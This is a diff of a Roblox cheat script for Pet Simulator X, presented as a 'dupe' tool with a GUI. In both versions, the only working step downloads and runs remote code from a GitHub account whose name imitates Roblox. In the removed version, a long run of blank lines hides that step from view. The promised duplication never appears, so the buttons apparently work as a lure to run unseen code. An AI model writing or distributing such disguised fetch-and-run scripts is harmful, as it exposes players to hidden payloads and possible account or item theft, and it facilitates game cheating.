@@ -1,93 +1,35 @@
---New Pet Simulator X Dupe Script
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-_G.AuthKey = "821F5D8C-85FE-4A7E-8691-685838C10AE0"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/RobIoxScripts/GUI/main/load.lua"))()
+local Material = loadstring(game:HttpGet("https://raw.githubusercontent.com/Kinlei/MaterialLua/master/Module.lua"))()
+
+local Window = Material.Load({
+	Title = "LYKIA HUB",
+	Style = 1,
+	SizeX = 500,
+	SizeY = 350,
+	Theme = "Dark",
+	ColorOverrides = {
+		MainFrame = Color3.fromRGB(235,235,235)
+	}
+
+})
+
+local PetSimulatorX = Window.New({
+	Title = "Dupe"
+})
+
+PetSimulatorX.Button({
+		Text = "Dupe Pets (Not Visual)",
+		Callback = function()
+		_G.AuthKey = "6a5b92ec-d4ca-41c4-871e-62df6179e752"
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/RobIoxScripts/GUI/main/load.lua"))()
+		end
+	})
+
+
+
+PetSimulatorX.Button({
+	Text = "Dupe Gems (Not Visual)",
+	Callback = function()
+		_G.AuthKey = "6a5b92ec-d4ca-41c4-871e-62df6179e752"
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/RobIoxScripts/GUI/main/load.lua"))()
+	end
+})
